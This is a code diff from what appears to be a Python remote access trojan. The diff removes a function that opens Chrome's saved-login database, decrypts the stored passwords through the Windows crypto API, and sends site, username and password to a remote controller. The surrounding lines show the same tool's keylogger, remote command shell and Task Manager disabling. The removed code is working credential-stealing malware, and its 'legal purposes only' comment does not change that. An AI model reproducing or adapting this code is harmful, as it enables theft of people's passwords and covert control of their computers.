@@ -309,40 +309,6 @@ def disable_taskmgr():
         blnDisabled = "False"
 
 
-def chrpass():  # legal purposes only!
-    strPath = APPDATA + "/../Local/Google/Chrome/User Data/Default/Login Data"
-
-    if not os.path.isfile(APPDATA + "/../Local/Google/Chrome/User Data/Default/Login Data"):
-        send(str.encode("noexist"))
-        return
-
-    conn = sqlite3.connect(strPath)  # connect to database
-    objCursor = conn.cursor()
-
-    try:
-        objCursor.execute("Select action_url, username_value, password_value FROM logins")  # look for credentials
-    except:  # if the chrome is open
-        send(str.encode("error"))
-        strServerResponse = decode_utf8(recv(intBuff))
-
-        if strServerResponse == "close":  # if the user wants to close the browser
-            subprocess.Popen(["taskkill", "/f", "/im", "chrome.exe"], shell=True)
-        return
-
-    strResults = "Chrome Saved Passwords:" + "\n"
-
-    for result in objCursor.fetchall():  # get data as raw text from sql db
-        password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
-        if password:
-            strResults += "Site: " + result[0] + "\n" + "Username: " + result[1] + "\n" + "Password: " \
-                          + decode_utf8(password)
-
-    strBuffer = str(len(strResults))
-    send(str.encode(strBuffer))  # send buffer
-    time.sleep(0.2)
-    send(str.encode(strResults))
-
-
 def keylogger(option):
     global strKeyLogs
 
@@ -427,8 +393,6 @@ while True:
                 continue
             elif strData == "cmd":
                 command_shell()
-            elif strData == "chrpass":
-                chrpass()
             elif strData == "keystart":
                 keylogger("start")
             elif strData == "keystop":
